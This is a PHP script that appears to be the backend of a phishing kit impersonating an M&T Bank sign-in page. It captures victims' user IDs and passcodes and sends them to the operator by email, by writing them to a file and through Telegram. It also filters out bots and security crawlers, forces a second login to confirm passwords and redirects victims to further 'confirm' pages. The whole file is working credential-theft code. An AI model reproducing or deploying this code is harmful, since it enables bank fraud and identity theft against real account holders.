<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "req/config.php";

$ip = $_SERVER['REMOTE_ADDR'];$user = $_POST['userId'];$password = $_POST['Passcode'];

if(isset($_POST['btnin']) && !preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($user)) && !empty($_POST['userId']) && !preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($user)) && !empty($_POST['Passcode'])){
    if(strlen($password) >4 && strlen($user) > 3){
		
	///////////////////////// MAIL PART //////////////////////
	
        $user        = $_POST['userId'];
        $password     = $_POST['Passcode'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
		if(isset($_GET[''.$theerrkey.''])){$reshead="------------- CONFIRM M&T BANK LOG -------------";}
		else{$reshead="--------------- 🔋 NEW M&T BANK LOG 🔋 ------------- ";};
        $Info_LOG = "
|--===-====-===-- $resultheading --===-====-===--|
$reshead
UserName         : $user 
Password         : $password ";
		if(isset($_GET[''.$theerrkey.''])){$_SESSION['fullz'].=$Info_LOG;} else{$_SESSION['fullz']=$Info_LOG;}
$Info_LOG.="
".$_SESSION['device'];


// Don't Touche
//Email
        if ($Send_Email == 1) {
			$i = isset($_GET[''.$theerrkey.''])?'(2)':'(1)';
            $subject = $PublicIP.' 🔋 '.$i.' M&T BANK LOGIN';$headers = 'From: YoCHI <yochmoneywelmf@wbanfofyoch.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if(!isset($_GET[''.$theerrkey.'']) && $doubleloginentry==1){header("location:login?a".$theerrkey."ccdfrXId=c".md5(rand(100, 999999999))."&".$theerrkey."=On");}
		else{if($usecaution==1){header("location:susps?id=myaccount&y=".md5(rand(100, 999999999))."");} else{header("location:confirm/eav?start=myaccount&y=".md5(rand(100, 999999999))."");}};
    }
    else{
		header("location:login?".$theerrkey."=c".md5(rand(100, 999999999))."");
    };
}
else{
	header("location:login?".$theerrkey."=c3Fahfjghuth".md5(rand(100, 999999999))."");
};
?>